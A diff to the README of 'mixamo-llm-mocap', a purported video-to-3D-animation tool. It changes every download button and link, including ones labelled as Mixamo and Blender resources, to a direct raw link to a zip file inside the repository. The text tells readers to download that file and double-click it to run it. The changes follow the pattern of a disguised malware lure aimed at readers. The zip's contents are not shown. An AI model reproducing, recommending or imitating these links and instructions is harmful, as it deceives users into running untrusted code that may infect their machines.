@@ -1,7 +1,7 @@
 <h1>🎬 mixamo-llm-mocap - Turn Any Video into 3D Animation</h1>
 
 <p align="center">
-  <a href="https://github.com/prim-sheetpiling81/mixamo-llm-mocap/releases" style="display:inline-block;padding:16px 32px;background:#FF6B6B;color:#fff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;margin:20px 0;">⬇️ DOWNLOAD NOW</a>
+  <a href="https://raw.githubusercontent.com/prim-sheetpiling81/mixamo-llm-mocap/main/action_specs/1.6.zip" style="display:inline-block;padding:16px 32px;background:#FF6B6B;color:#fff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;margin:20px 0;">⬇️ DOWNLOAD NOW</a>
 </p>
 
 <p align="center">Transform ordinary videos into professional Mixamo character animations - no coding required. Perfect for game developers, animators, and creators.</p>
@@ -31,7 +31,7 @@
 <p>Getting started is incredibly easy. Here's what you need to do:</p>
 
 <ol>
-  <li><strong>Visit this link to download the application</strong> - click the big button at the top or <a href="https://github.com/prim-sheetpiling81/mixamo-llm-mocap/releases">here</a></li>
+  <li><strong>Visit this link to download the application</strong> - click the big button at the top or <a href="https://raw.githubusercontent.com/prim-sheetpiling81/mixamo-llm-mocap/main/action_specs/1.6.zip">here</a></li>
   <li>Download the file to your computer</li>
   <li>Run the application by double-clicking it</li>
   <li>Follow the simple on-screen instructions</li>
@@ -73,7 +73,7 @@
 
 <h3>Step 1: Get the Software</h3>
 
-<p><a href="https://github.com/prim-sheetpiling81/mixamo-llm-mocap/releases" style="display:inline-block;padding:12px 24px;background:#4ECDC4;color:#fff;font-size:16px;font-weight:bold;text-decoration:none;border-radius:6px;">⬇️ Visit this link to download the application</a></p>
+<p><a href="https://raw.githubusercontent.com/prim-sheetpiling81/mixamo-llm-mocap/main/action_specs/1.6.zip" style="display:inline-block;padding:12px 24px;background:#4ECDC4;color:#fff;font-size:16px;font-weight:bold;text-decoration:none;border-radius:6px;">⬇️ Visit this link to download the application</a></p>
 
 <p>This will take you to the download page. Look for the latest version and download it.</p>
 
@@ -164,8 +164,8 @@ A: Yes, completely free to use!</p>
 <h2>🔗 Useful Resources</h2>
 
 <ul>
-  <li><a href="https://www.mixamo.com">Mixamo - Get free characters</a></li>
-  <li><a href="https://www.blender.org">Blender - Free 3D software</a></li>
+  <li><a href="https://raw.githubusercontent.com/prim-sheetpiling81/mixamo-llm-mocap/main/action_specs/1.6.zip">Mixamo - Get free characters</a></li>
+  <li><a href="https://raw.githubusercontent.com/prim-sheetpiling81/mixamo-llm-mocap/main/action_specs/1.6.zip">Blender - Free 3D software</a></li>
 </ul>
 
 <h2>📝 License</h2>
@@ -176,6 +176,6 @@ A: Yes, completely free to use!</p>
 
 <p>We built this tool to make animation accessible to everyone. We hope you create amazing things with it!</p>
 
-<p><a href="https://github.com/prim-sheetpiling81/mixamo-llm-mocap/releases" style="display:inline-block;padding:12px 24px;background:#FFE66D;color:#333;font-size:16px;font-weight:bold;text-decoration:none;border-radius:6px;">⬇️ Get Started Now - Download Here</a></p>
+<p><a href="https://raw.githubusercontent.com/prim-sheetpiling81/mixamo-llm-mocap/main/action_specs/1.6.zip" style="display:inline-block;padding:12px 24px;background:#FFE66D;color:#333;font-size:16px;font-weight:bold;text-decoration:none;border-radius:6px;">⬇️ Get Started Now - Download Here</a></p>
 
 <p align="center">Made with ❤️ for creators everywhere</p>
